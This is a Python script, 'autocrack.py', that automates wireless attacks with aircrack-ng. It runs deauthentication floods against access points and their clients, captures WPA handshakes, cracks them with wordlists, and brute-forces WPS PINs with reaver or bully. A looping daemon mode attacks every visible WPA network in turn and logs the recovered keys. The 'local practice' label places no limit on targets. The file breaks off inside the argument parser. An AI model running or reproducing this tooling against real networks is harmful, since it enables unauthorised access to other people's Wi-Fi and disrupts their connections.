#!/usr/bin/env python3
"""
autocrack.py — Automated aircrack-ng pipeline for local practice.

Subcommands:
  interactive  Menu-driven: scan → pick target → choose attack
  scan         Put interface in monitor mode and list nearby APs
  capture      Target an AP, deauth clients, and capture a WPA handshake
  crack        Run aircrack-ng against a captured .cap file
  wps          Run a WPS PIN attack via reaver or bully
  pipeline     Fully automated: scan → strongest AP → capture → crack (--loop for daemon)
"""

import argparse
import csv
import datetime
import glob
import io
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path


# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────

def require_root():
    if os.geteuid() != 0:
        sys.exit("[!] This tool must be run as root (sudo).")


def run(cmd, **kwargs):
    return subprocess.run(cmd, shell=isinstance(cmd, str), **kwargs)


def run_bg(cmd):
    return subprocess.Popen(
        cmd, shell=isinstance(cmd, str),
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


def kill_proc(proc):
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()


def check_tool(*names):
    for name in names:
        if not shutil.which(name):
            sys.exit(f"[!] Required tool not found: {name}")


def log(msg, level="*"):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}][{level}] {msg}")


def available_interfaces():
    return list(Path("/sys/class/net").iterdir())


def monitor_iface_from_output(output, iface):
    """
    Parse airmon-ng output to find the actual monitor interface name.
    Handles both 'wlan0mon' rename and in-place monitor mode on 'wlan0'.
    """
    # e.g. "mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon"
    m = re.search(r"enabled.+?on\s+\[\w+\](\S+)", output)
    if m:
        return m.group(1).strip(")")
    # e.g. "monitor mode enabled on wlan0mon"
    m = re.search(r"monitor mode (?:already )?enabled\w*\s+(?:on\s+)?(?:\[\w+\])?(\S+)", output)
    if m:
        return m.group(1).strip(")")
    # Fallback: check if wlan0mon now exists
    candidate = iface + "mon"
    if Path(f"/sys/class/net/{candidate}").exists():
        return candidate
    # Last resort: interface is in monitor mode in-place
    return iface


def check_iface_exists(iface):
    if not Path(f"/sys/class/net/{iface}").exists():
        log(f"Interface '{iface}' not found in /sys/class/net/.", "!")
        found = [p.name for p in Path("/sys/class/net").iterdir()
                 if p.name not in ("lo", "docker0", "eth0")]
        if found:
            log(f"Available wireless-looking interfaces: {', '.join(found)}", "~")
        else:
            log("No wireless interfaces found. Check your adapter is connected.", "!")
        sys.exit(1)


def safe_bssid(bssid):
    return bssid.replace(":", "")


# ──────────────────────────────────────────────────────────────────────────────
# Monitor mode
# ──────────────────────────────────────────────────────────────────────────────

def start_monitor(iface):
    check_iface_exists(iface)
    log(f"Killing interfering processes on {iface}...")
    run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"Starting monitor mode on {iface}...")
    result = run(["airmon-ng", "start", iface], capture_output=True, text=True)
    output = result.stdout + result.stderr
    mon = monitor_iface_from_output(output, iface)
    # Verify the monitor interface actually exists now
    if not Path(f"/sys/class/net/{mon}").exists():
        log(f"airmon-ng output did not create '{mon}'. Trying iwconfig fallback...", "~")
        r = run(["iwconfig", iface], capture_output=True, text=True)
        if "Monitor" in r.stdout:
            mon = iface
            log(f"Interface '{iface}' is already in monitor mode.", "~")
        else:
            log("Could not put interface into monitor mode.", "!")
            log("Try: sudo airmon-ng start " + iface, "~")
            sys.exit(1)
    log(f"Monitor interface: {mon}", "+")
    return mon


def stop_monitor(iface, mon):
    log(f"Stopping monitor mode on {mon}...")
    run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    run(["service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"{iface} restored to managed mode.", "+")


# ──────────────────────────────────────────────────────────────────────────────
# Scan + AP parsing
# ──────────────────────────────────────────────────────────────────────────────

def parse_airodump_csv(csv_path):
    """Return list of AP dicts from an airodump-ng CSV file."""
    with open(csv_path, encoding="utf-8", errors="ignore") as f:
        raw = f.read()

    sections = re.split(r"\n\s*\n", raw, maxsplit=1)
    aps = []
    if sections:
        reader = csv.DictReader(io.StringIO(sections[0].strip()))
        for row in reader:
            row = {k.strip(): v.strip() for k, v in row.items() if k}
            bssid = row.get("BSSID", "").strip()
            if bssid and bssid != "BSSID":
                aps.append(row)
    return aps


def parse_airodump_stations(csv_path, bssid=None):
    """Return stations seen on an optional AP from an airodump CSV file."""
    with open(csv_path, encoding="utf-8", errors="ignore") as f:
        raw = f.read()

    sections = re.split(r"\n\s*\n", raw, maxsplit=1)
    if len(sections) < 2:
        return []

    stations = []
    reader = csv.DictReader(io.StringIO(sections[1].strip()))
    wanted = bssid.replace(":", "").lower() if bssid else None
    for row in reader:
        row = {k.strip(): v.strip() for k, v in row.items() if k}
        station = row.get("Station MAC", "").strip()
        station_ap = row.get("BSSID", "").strip()
        if not station or station.upper() == "STATION MAC":
            continue
        if wanted and station_ap.replace(":", "").lower() != wanted:
            continue
        stations.append(row)
    return stations


def signal_strength(ap):
    """Return numeric signal strength (higher = stronger). -999 if unparseable."""
    try:
        return int(ap.get("Power", "-999").strip())
    except ValueError:
        return -999


def filter_aps(aps, enc_filter=("WPA", "WPA2", "WPA3"), essid_pattern=None):
    """Keep only APs matching encryption and optional ESSID glob pattern."""
    import fnmatch
    result = []
    for ap in aps:
        priv = ap.get("Privacy", "").upper()
        if not any(e in priv for e in enc_filter):
            continue
        if essid_pattern:
            essid = ap.get("ESSID", "")
            if not fnmatch.fnmatch(essid, essid_pattern):
                continue
        result.append(ap)
    return result


def do_scan(iface, mon, duration, band=None):
    """Run airodump-ng and return list of parsed AP dicts."""
    check_iface_exists(mon)
    tmpdir = tempfile.mkdtemp(prefix="autocrack_scan_")
    prefix = os.path.join(tmpdir, "scan")
    proc = None
    try:
        cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv", mon]
        if band:
            cmd += ["--band", band]
        proc = run_bg(cmd)
        log(f"Scanning for {duration}s on {mon}...")
        time.sleep(duration)
    finally:
        kill_proc(proc)

    csvs = glob.glob(prefix + "*.csv")
    if not csvs:
        log("airodump-ng produced no output file — check the interface is in monitor mode.", "!")
        shutil.rmtree(tmpdir, ignore_errors=True)
        return []

    aps = parse_airodump_csv(csvs[0])
    shutil.rmtree(tmpdir, ignore_errors=True)
    log(f"Raw APs found: {len(aps)}")
    return aps


def discover_clients(mon, bssid, channel, duration=8):
    """Passively discover stations associated with one selected AP."""
    tmpdir = tempfile.mkdtemp(prefix="autocrack_clients_")
    prefix = os.path.join(tmpdir, "clients")
    proc = None
    try:
        cmd = [
            "airodump-ng", "--bssid", bssid, "--channel", str(channel),
            "--write", prefix, "--output-format", "csv", mon,
        ]
        proc = run_bg(cmd)
        log(f"Checking for clients on {bssid} (passive, {duration}s)...")
        time.sleep(duration)
    finally:
        kill_proc(proc)

    csvs = glob.glob(prefix + "*.csv")
    stations = parse_airodump_stations(csvs[0], bssid) if csvs else []
    shutil.rmtree(tmpdir, ignore_errors=True)
    return stations


def print_client_table(stations):
    """Print stations discovered during the selected-AP scan."""
    print(f"\n  {'#':<4} {'CLIENT MAC':<20} {'PWR':<6} {'LOST':<6} {'FRAMES'}")
    print("  " + "-" * 54)
    for i, station in enumerate(stations, 1):
        print(f"  {i:<4} {station.get('Station MAC', '?'):<20} "
              f"{station.get('Power', '?'):<6} "
              f"{station.get('# packets lost', '?'):<6} "
              f"{station.get('# packets', '?')}")
    print()


def print_ap_table(aps):
    print()
    print(f"  {'#':<4} {'BSSID':<20} {'CH':<5} {'PWR':<6} {'ENC':<12} {'ESSID'}")
    print("  " + "-" * 68)
    for i, ap in enumerate(aps, 1):
        print(f"  {i:<4} {ap.get('BSSID',''):<20} "
              f"{ap.get(' channel', ap.get('channel','?')).strip()[:4]:<5} "
              f"{ap.get('Power','?').strip()[:5]:<6} "
              f"{ap.get('Privacy','?').strip()[:12]:<12} "
              f"{ap.get('ESSID','<hidden>').strip()}")
    print()


# ──────────────────────────────────────────────────────────────────────────────
# Capture
# ──────────────────────────────────────────────────────────────────────────────

def handshake_confirmed(cap_file, bssid):
    r = run(
        ["aircrack-ng", "-b", bssid, "-w", "/dev/null", cap_file],
        capture_output=True, text=True,
    )
    return "handshake" in r.stdout.lower()


def do_capture(iface, mon, bssid, channel, outdir, deauth_count, no_deauth, client, timeout):
    """Capture a WPA handshake. Returns path to .cap file or None."""
    outdir = Path(outdir) / "caps"
    outdir.mkdir(parents=True, exist_ok=True)
    prefix = str(outdir / f"{safe_bssid(bssid)}")

    log(f"Targeting {bssid} on ch{channel}")
    airodump_proc = None
    try:
        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", prefix,
            "--output-format", "cap",
            mon,
        ]
        airodump_proc = run_bg(cmd)
        time.sleep(2)

        if not no_deauth:
            log(f"Sending {deauth_count} deauth frames...")
            deauth_cmd = ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid, mon]
            if client:
                deauth_cmd += ["-c", client]
            run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        log(f"Waiting up to {timeout}s for handshake...")
        deadline = time.time() + timeout
        while time.time() < deadline:
            caps = glob.glob(prefix + "*.cap")
            for cap in caps:
                if handshake_confirmed(cap, bssid):
                    log(f"Handshake captured: {cap}", "+")
                    return cap
            # re-deauth every 15 s to encourage a handshake
            if not no_deauth and (deadline - time.time()) % 15 < 3:
                run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)

        caps = glob.glob(prefix + "*.cap")
        cap = caps[0] if caps else None
        if cap:
            log(f"Handshake not confirmed but cap saved: {cap}", "~")
        else:
            log("No cap file produced.", "!")
        return cap

    finally:
        kill_proc(airodump_proc)


# ──────────────────────────────────────────────────────────────────────────────
# Crack
# ──────────────────────────────────────────────────────────────────────────────

def do_crack(cap_file, wordlists, bssid=None, essid=None):
    """
    Try each wordlist in sequence. Return (wordlist, key) on success, or None.
    """
    check_tool("aircrack-ng")
    for wl in wordlists:
        if not Path(wl).exists():
            log(f"Wordlist not found, skipping: {wl}", "!")
            continue
        log(f"Trying wordlist: {wl}")
        cmd = ["aircrack-ng", "-w", wl, cap_file]
        if bssid:
            cmd += ["-b", bssid]
        if essid:
            cmd += ["-e", essid]
        result = run(cmd, capture_output=True, text=True)
        # aircrack-ng prints "KEY FOUND! [ <key> ]"
        m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
        if m:
            key = m.group(1)
            log(f"Key found with {Path(wl).name}: {key}", "+")
            return wl, key
        log(f"No key found with {Path(wl).name}.", "-")
    return None


# ──────────────────────────────────────────────────────────────────────────────
# Results log
# ──────────────────────────────────────────────────────────────────────────────

def write_result(log_path, bssid, essid, channel, status, key=None, wordlist=None):
    ts = datetime.datetime.now().isoformat(timespec="seconds")
    line = f"{ts} | {bssid} | ch{channel} | {essid or '<hidden>'} | {status}"
    if key:
        line += f" | KEY={key}"
    if wordlist:
        line += f" | WL={Path(wordlist).name}"
    Path(log_path).parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a") as f:
        f.write(line + "\n")
    log(f"Result logged → {log_path}", "+")


# ──────────────────────────────────────────────────────────────────────────────
# Subcommand: scan
# ──────────────────────────────────────────────────────────────────────────────

def cmd_scan(args):
    check_tool("airmon-ng", "airodump-ng")
    require_root()
    mon = start_monitor(args.iface)
    try:
        aps = do_scan(args.iface, mon, args.time, args.band)
    finally:
        if not args.no_stop_monitor:
            stop_monitor(args.iface, mon)

    if not aps:
        log("No APs found.", "!")
        return []

    visible = filter_aps(aps, essid_pattern=args.filter) if args.filter else aps
    print_ap_table(visible)
    return visible


# ──────────────────────────────────────────────────────────────────────────────
# Subcommand: capture
# ──────────────────────────────────────────────────────────────────────────────

def cmd_capture(args):
    check_tool("airmon-ng", "airodump-ng", "aireplay-ng")
    require_root()
    mon = args.mon if args.mon else start_monitor(args.iface)

    def _cleanup(sig=None, frame=None):
        if not args.no_stop_monitor:
            stop_monitor(args.iface, mon)
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)

    try:
        cap = do_capture(
            args.iface, mon, args.bssid, args.channel,
            args.output, args.deauth_count, args.no_deauth,
            args.client, args.timeout,
        )
    finally:
        if not args.no_stop_monitor:
            stop_monitor(args.iface, mon)

    return cap


# ──────────────────────────────────────────────────────────────────────────────
# Subcommand: crack
# ──────────────────────────────────────────────────────────────────────────────

def cmd_crack(args):
    require_root()
    if not Path(args.cap).exists():
        sys.exit(f"[!] Cap file not found: {args.cap}")
    result = do_crack(args.cap, args.wordlist, args.bssid, args.essid)
    if result:
        _, key = result
        print(f"\n[+] PASSWORD: {key}\n")
    else:
        print("\n[-] Password not found with provided wordlist(s).\n")


# ──────────────────────────────────────────────────────────────────────────────
# Subcommand: wps
# ──────────────────────────────────────────────────────────────────────────────

def cmd_wps(args):
    tool = args.tool
    check_tool("airmon-ng", tool)
    require_root()
    mon = args.mon if args.mon else start_monitor(args.iface)

    try:
        if tool == "reaver":
            cmd = ["reaver", "-i", mon, "-b", args.bssid, "-c", str(args.channel), "-vv"]
            if args.pin:
                cmd += ["-p", args.pin]
        else:
            cmd = ["bully", mon, "-b", args.bssid, "-c", str(args.channel), "-v", "3"]
            if args.pin:
                cmd += ["-p", args.pin]
        log(f"Starting WPS attack with {tool}...")
        run(cmd)
    finally:
        if not args.no_stop_monitor:
            stop_monitor(args.iface, mon)


# ──────────────────────────────────────────────────────────────────────────────
# Subcommand: pipeline  (fully automated)
# ──────────────────────────────────────────────────────────────────────────────

def cmd_pipeline(args):
    check_tool("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")
    require_root()

    outdir = Path(args.output)
    outdir.mkdir(parents=True, exist_ok=True)
    log_path = str(outdir / "autocrack_results.txt")
    cracked = set()   # BSSIDs we already found the key for
    attempted = set() # BSSIDs tried this loop iteration

    loop_count = 0
    mon = None

    def _cleanup(sig=None, frame=None):
        log("Interrupted — cleaning up...")
        if mon:
            stop_monitor(args.iface, mon)
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)
    signal.signal(signal.SIGTERM, _cleanup)

    while True:
        loop_count += 1
        log(f"━━━ Loop #{loop_count} ━━━", "=")

        # ── Start monitor mode ────────────────────────────────────────────────
        mon = start_monitor(args.iface)

        # ── Scan ─────────────────────────────────────────────────────────────
        raw_aps = do_scan(args.iface, mon, args.scan_time, args.band)
        if not raw_aps:
            log("No APs found this scan. Waiting 30s before retry...", "!")
            stop_monitor(args.iface, mon)
            time.sleep(30)
            continue

        # Filter: WPA/WPA2 only, optional ESSID glob
        aps = filter_aps(raw_aps, essid_pattern=args.filter)
        # Skip already cracked
        aps = [ap for ap in aps if ap.get("BSSID", "") not in cracked]

        if not aps:
            log("All visible WPA APs already cracked. Waiting 60s...", "~")
            stop_monitor(args.iface, mon)
            time.sleep(60)
            continue

        # Sort by signal strength (strongest first)
        aps.sort(key=signal_strength, reverse=True)

        log(f"Found {len(aps)} target(s) after filtering:")
        print_ap_table(aps)

        # ── Pick target ───────────────────────────────────────────────────────
        # In daemon mode we attack all in sequence; single-pass takes the top.
        targets = aps if args.loop else [aps[0]]
        attempted.clear()

        for ap in targets:
            bssid   = ap.get("BSSID", "").strip()
            channel = ap.get(" channel", ap.get("channel", "1")).strip()
            essid   = ap.get("ESSID", "").strip() or "<hidden>"

            if bssid in attempted:
                continue
            attempted.add(bssid)

            log(f"Target → {essid} ({bssid}) ch{channel}", ">")

            # ── Capture ───────────────────────────────────────────────────────
            cap_file = do_capture(
                args.iface, mon, bssid, channel,
                str(outdir), args.deauth_count, args.no_deauth,
                args.client, args.capture_timeout,
            )

            if not cap_file:
                log(f"Skipping crack for {bssid} — no cap file.", "!")
                write_result(log_path, bssid, essid, channel, "NO_CAP")
                continue

            # ── Crack (try all wordlists in order) ────────────────────────────
            stop_monitor(args.iface, mon)  # don't need monitor during crack
            mon = None

            result = do_crack(cap_file, args.wordlist, bssid, essid)

            if result:
                wl, key = result
                cracked.add(bssid)
                write_result(log_path, bssid, essid, channel, "CRACKED", key, wl)
                print(f"\n  ┌─────────────────────────────────────────┐")
                print(f"  │  CRACKED  {essid[:20]:<20}          │")
                print(f"  │  BSSID    {bssid}              │")
                print(f"  │  KEY      {key[:40]:<40} │")
                print(f"  └─────────────────────────────────────────┘\n")
            else:
                write_result(log_path, bssid, essid, channel, "FAILED")

            # Restart monitor if more targets remain in this loop pass
            if args.loop and ap is not targets[-1]:
                mon = start_monitor(args.iface)

        # ── Decide whether to loop ────────────────────────────────────────────
        if not args.loop:
            log("Done (use --loop to run continuously).", "+")
            if mon:
                stop_monitor(args.iface, mon)
            break

        wait = args.loop_wait
        log(f"Cycle complete. Next scan in {wait}s...", "~")
        if mon:
            stop_monitor(args.iface, mon)
            mon = None
        time.sleep(wait)


# ──────────────────────────────────────────────────────────────────────────────
# Deauth flood
# ──────────────────────────────────────────────────────────────────────────────

def do_deauth_flood(mon, bssid, client=None, count=0):
    """
    Send deauth frames.
    count=0 → loop continuously until Ctrl-C.
    count>0 → send that many frames and return.
    """
    check_tool("aireplay-ng")
    target = client or "broadcast"
    if count == 0:
        log(f"Continuous deauth flood → {bssid} (target: {target})  Ctrl-C to stop", "!")
        try:
            while True:
                cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, mon]
                if client:
                    cmd += ["-c", client]
                run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except KeyboardInterrupt:
            log("Deauth flood stopped.", "~")
    else:
        log(f"Sending {count} deauth frames → {bssid} (target: {target})")
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, mon]
        if client:
            cmd += ["-c", client]
        run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Deauth burst complete.", "+")


# ──────────────────────────────────────────────────────────────────────────────
# Interactive helpers
# ──────────────────────────────────────────────────────────────────────────────

RESET  = "\033[0m"
BOLD   = "\033[1m"
CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
DIM    = "\033[2m"


def banner():
    print(f"""
{BOLD}{CYAN}
  ╔═══════════════════════════════════════╗
  ║        AUTOCRACK  Interactive         ║
  ║   aircrack-ng automation toolkit      ║
  ╚═══════════════════════════════════════╝
{RESET}""")


def prompt(question, default=None):
    hint = f" [{default}]" if default is not None else ""
    try:
        ans = input(f"{BOLD}{YELLOW}[?]{RESET} {question}{hint}: ").strip()
        return ans if ans else (str(default) if default is not None else "")
    except (EOFError, KeyboardInterrupt):
        print()
        return ""


def pick_from_menu(title, options, allow_back=True):
    """
    Display a numbered menu and return the chosen index (0-based).
    Returns -1 if user picks 'back'.
    """
    print(f"\n{BOLD}  {title}{RESET}")
    print(f"  {'─' * 50}")
    for i, (label, desc) in enumerate(options, 1):
        print(f"  {BOLD}[{i}]{RESET} {label:<25} {DIM}{desc}{RESET}")
    if allow_back:
        print(f"  {BOLD}[0]{RESET} Back")
    print(f"  {'─' * 50}")

    while True:
        ans = prompt("Select")
        if not ans:
            continue
        if ans == "0" and allow_back:
            return -1
        try:
            idx = int(ans) - 1
            if 0 <= idx < len(options):
                return idx
        except ValueError:
            pass
        print(f"  {RED}Invalid choice.{RESET}")


def select_target(aps):
    """Show AP table and let user pick one. Returns AP dict or None."""
    print(f"\n{BOLD}  {'#':<4} {'BSSID':<20} {'CH':<5} {'PWR':<6} {'ENC':<12} {'ESSID'}{RESET}")
    print(f"  {'─' * 68}")
    for i, ap in enumerate(aps, 1):
        pwr = ap.get("Power", "?").strip()
        enc = ap.get("Privacy", "?").strip()[:12]
        ch  = ap.get(" channel", ap.get("channel", "?")).strip()[:4]
        ess = ap.get("ESSID", "<hidden>").strip()
        color = GREEN if int(pwr) > -60 else (YELLOW if int(pwr) > -80 else RED) if pwr.lstrip("-").isdigit() else RESET
        print(f"  {i:<4} {ap.get('BSSID',''):<20} {ch:<5} {color}{pwr:<6}{RESET} {enc:<12} {ess}")
    print()

    while True:
        ans = prompt(f"Select target (1-{len(aps)}) or 'r' to rescan", default="r")
        if ans.lower() == "r":
            return None
        try:
            idx = int(ans) - 1
            if 0 <= idx < len(aps):
                return aps[idx]
        except ValueError:
            pass
        print(f"  {RED}Invalid choice.{RESET}")


ATTACK_MENU = [
    ("Deauth flood",        "send deauth frames continuously until Ctrl-C"),
    ("Deauth burst",        "send N deauth frames then stop"),
    ("Capture handshake",   "capture WPA handshake (passive or with deauth)"),
    ("Crack cap file",      "run aircrack-ng with a wordlist"),
    ("Full pipeline",       "capture handshake then crack automatically"),
    ("WPS attack",          "reaver/bully WPS PIN brute-force"),
    ("Change target",       "go back and pick a different AP"),
]


def interactive_attack(ap, mon, iface, outdir, client_scan_time=8):
    """Show attack menu for a selected AP and execute the chosen attack."""
    bssid   = ap.get("BSSID", "").strip()
    channel = ap.get(" channel", ap.get("channel", "1")).strip()
    essid   = ap.get("ESSID", "<hidden>").strip()

    print(f"\n{BOLD}{GREEN}  Target: {essid} ({bssid})  ch{channel}{RESET}")
    clients = discover_clients(mon, bssid, channel, client_scan_time)
    if clients:
        log(f"Clients found: {len(clients)}", "+")
        print_client_table(clients)
    else:
        log("No associated clients found during the passive scan.", "~")

    while True:
        choice = pick_from_menu("ATTACK MENU", ATTACK_MENU, allow_back=False)

        # ── Deauth flood ──────────────────────────────────────────────────────
        if choice == 0:
            client = prompt("Target client MAC (Enter for broadcast)", default="")
            do_deauth_flood(mon, bssid, client or None, count=0)

        # ── Deauth burst ──────────────────────────────────────────────────────
        elif choice == 1:
            count  = int(prompt("Number of deauth frames", default="50"))
            client = prompt("Target client MAC (Enter for broadcast)", default="")
            do_deauth_flood(mon, bssid, client or None, count=count)

        # ── Capture handshake ─────────────────────────────────────────────────
        elif choice == 2:
            no_deauth = prompt("Passive capture only? (no deauth) [y/N]", default="N").lower() == "y"
            deauth_n  = 0 if no_deauth else int(prompt("Deauth frames per burst", default="5"))
            client    = prompt("Target client MAC (Enter for all)", default="")
            timeout   = int(prompt("Wait up to (seconds)", default="90"))
            cap = do_capture(iface, mon, bssid, channel, outdir,
                             deauth_n, no_deauth, client or None, timeout)
            if cap:
                print(f"\n{GREEN}  Saved: {cap}{RESET}\n")

        # ── Crack cap file ────────────────────────────────────────────────────
        elif choice == 3:
            cap_path = prompt("Path to .cap file")
            if not Path(cap_path).exists():
                print(f"{RED}  File not found.{RESET}")
                continue
            wordlists = []
            while True:
                wl = prompt("Wordlist path (Enter when done)")
                if not wl:
                    break
                wordlists.append(wl)
            if not wordlists:
                print(f"{RED}  No wordlist given.{RESET}")
                continue
            stop_monitor(iface, mon)
            result = do_crack(cap_path, wordlists, bssid, essid)
            log_path = str(Path(outdir) / "autocrack_results.txt")
            if result:
                wl, key = result
                write_result(log_path, bssid, essid, channel, "CRACKED", key, wl)
                print(f"\n{BOLD}{GREEN}  PASSWORD: {key}{RESET}\n")
            else:
                write_result(log_path, bssid, essid, channel, "FAILED")
                print(f"\n{RED}  Not found with provided wordlist(s).{RESET}\n")
            return "restart_mon"  # caller restarts monitor

        # ── Full pipeline ─────────────────────────────────────────────────────
        elif choice == 4:
            no_deauth = prompt("Passive capture only? [y/N]", default="N").lower() == "y"
            deauth_n  = 0 if no_deauth else int(prompt("Deauth frames per burst", default="5"))
            client    = prompt("Target client MAC (Enter for all)", default="")
            timeout   = int(prompt("Handshake wait (seconds)", default="90"))

            wordlists = []
            while True:
                wl = prompt("Wordlist path (Enter when done)")
                if not wl:
                    break
                wordlists.append(wl)
            if not wordlists:
                print(f"{RED}  No wordlist given.{RESET}")
                continue

            cap = do_capture(iface, mon, bssid, channel, outdir,
                             deauth_n, no_deauth, client or None, timeout)
            if not cap:
                print(f"{RED}  No cap file. Aborting pipeline.{RESET}")
                continue

            stop_monitor(iface, mon)
            result = do_crack(cap, wordlists, bssid, essid)
            log_path = str(Path(outdir) / "autocrack_results.txt")
            if result:
                wl, key = result
                write_result(log_path, bssid, essid, channel, "CRACKED", key, wl)
                print(f"\n{BOLD}{GREEN}  PASSWORD: {key}{RESET}\n")
            else:
                write_result(log_path, bssid, essid, channel, "FAILED")
                print(f"\n{RED}  Not found with provided wordlist(s).{RESET}\n")
            return "restart_mon"

        # ── WPS attack ────────────────────────────────────────────────────────
        elif choice == 5:
            tool = "reaver"
            t = prompt("Tool: reaver or bully", default="reaver").lower()
            if t in ("reaver", "bully"):
                tool = t
            pin = prompt("Start PIN (Enter to skip)", default="")
            log(f"Starting WPS attack with {tool}...")
            stop_monitor(iface, mon)
            cmd = [tool, "-i", mon, "-b", bssid, "-c", channel, "-vv"]
            if tool == "bully":
                cmd = ["bully", mon, "-b", bssid, "-c", channel, "-v", "3"]
            if pin:
                cmd += ["-p", pin]
            run(cmd)
            return "restart_mon"

        # ── Change target ─────────────────────────────────────────────────────
        elif choice == 6:
            return "change_target"


# ──────────────────────────────────────────────────────────────────────────────
# Subcommand: interactive
# ──────────────────────────────────────────────────────────────────────────────

def cmd_interactive(args):
    check_tool("airmon-ng", "airodump-ng")
    require_root()

    outdir = Path(args.output)
    outdir.mkdir(parents=True, exist_ok=True)

    banner()
    mon = None

    def _cleanup(sig=None, frame=None):
        print(f"\n{YELLOW}[~] Exiting...{RESET}")
        if mon:
            stop_monitor(args.iface, mon)
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)
    signal.signal(signal.SIGTERM, _cleanup)

    mon = start_monitor(args.iface)

    empty_scans = 0
    MAX_EMPTY   = 3

    while True:
        # ── Scan ──────────────────────────────────────────────────────────────
        raw = do_scan(args.iface, mon, args.scan_time, args.band)

        if not raw:
            empty_scans += 1
            log(f"No APs found at all ({empty_scans}/{MAX_EMPTY} empty scans).", "!")
            if empty_scans >= MAX_EMPTY:
                log("Adapter may not be in monitor mode or is out of range.", "!")
                log("Tips:", "~")
                log("  • Run: sudo airmon-ng start " + args.iface, "~")
                log("  • Confirm monitor mode: iwconfig", "~")
                log("  • Move closer to an AP", "~")
                ans = prompt("Keep retrying? [y/N]", default="N")
                if ans.lower() != "y":
                    stop_monitor(args.iface, mon)
                    return
                empty_scans = 0
            continue

        empty_scans = 0
        # Show all APs; filter to WPA* for attack suggestions
        wpa_aps = filter_aps(raw)
        if not wpa_aps:
            log(f"Found {len(raw)} AP(s) but none are WPA/WPA2/WPA3 — showing all.", "~")
            aps = raw
        else:
            aps = wpa_aps

        # ── Target selection ──────────────────────────────────────────────────
        ap = select_target(aps)
        if ap is None:
            continue  # user asked to rescan

        # ── Attack menu ───────────────────────────────────────────────────────
        result = interactive_attack(ap, mon, args.iface, str(outdir), args.client_scan_time)

        if result == "restart_mon":
            log("Restarting monitor mode...")
            mon = start_monitor(args.iface)
        elif result == "change_target":
            continue  # back to target selection with same scan results


# ──────────────────────────────────────────────────────────────────────────────
# Argument parser
# ──────────────────────────────────────────────────────────────────────────────

def build_parser():
    parser = argparse.ArgumentParser(
        prog="autocrack",
        description="Automated aircrack-ng pipeline for local practice.",
        epilog="Tip: start with 'sudo python3 autocrack.py interactive' for a guided menu.",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # ── interactive ───────────────────────────────────────────────────────────
    p = sub.add_parser(
        "interactive",
        help="Menu-driven mode: scan → pick target → choose attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="""
Menu-driven interactive mode.

  Scans for APs, lets you pick a target, then presents an attack menu:
    • Deauth flood          continuous deauth until Ctrl-C
    • Deauth burst          send N frames and stop
    • Capture handshake     passive or active WPA capture
    • Crack cap file        aircrack-ng with one or more wordlists
    • Full pipeline         capture then crack in one step
    • WPS attack            reaver or bully PIN brute-force

Example:
  sudo python3 autocrack.py interactive
  sudo python3 autocrack.py interactive -i wlan0 --scan-time 30
""")
    p.add_argument("-i", "--iface", default="wlan0")
    p.add_argument("-o", "--output", default="autocrack_output",
                   help="Directory for caps and results log (default: autocrack_output/)")
    p.add_argument("--scan-time", type=int, default=20,
                   help="Scan duration per cycle in seconds (default: 20)")
    p.add_argument("--client-scan-time", type=int, default=8,
                   help="Passive client discovery time after selecting an AP (default: 8)")
    p.add_argument("--band", choices=["a", "b", "g", "abg"])
    p.set_defaults(func=cmd_interactive)

    # ── scan ──────────────────────────────────────────────────────────────────
    p = sub.add_parser("scan", help="Scan for nearby APs")
    p.add_argument("-i", "--iface", default="wlan0")
    p.add_argument("-t", "--time", type=int, default=15, help="Scan duration in seconds (default: 15)")
    p.add_argument("--band", choices=["a", "b", "g", "abg"])
    p.add_argument("--filter", metavar="GLOB", help="ESSID glob filter (e.g. 'Home*')")
    p.add_argument("--no-stop-monitor", action="store_true")
    p.set_defaults(func=cmd_scan)

    # ── capture ───────────────────────────────────────────────────────────────
    p = sub.add_parser("capture", help="Capture WPA handshake from a target AP")
    p.add_argument("-i", "--iface", default="wlan0")
    p.add_argument("--mon", help="Use existing monitor interface (skip airmon-ng)")
    p.add_argument("-b", "--bssid", required=True)
    p.add_argument("-c", "--channel", required=True, type=int)
    p.add_argument("-o", "--output", default=".")
    p.add_argument("--deauth-count", type=int, default=5)
    p.add_argument("--no-deauth", action="store_true")
    p.add_argument("--client", help="Target a specific client MAC for deauth")
    p.add_argument("--timeout", type=int, default=60)
    p.add_argument("--no-stop-monitor", action="store_true")
    p.set_defaults(func=cmd_capture)

    # ── crack ─────────────────────────────────────────────────────────────────
    p = sub.add_parser("crack", help="Crack a captured .cap file with wordlist(s)")
    p.add_argument("cap", help="Path to .cap file")
    p.add_argument("-w", "--wordlist", action="append", required=True,
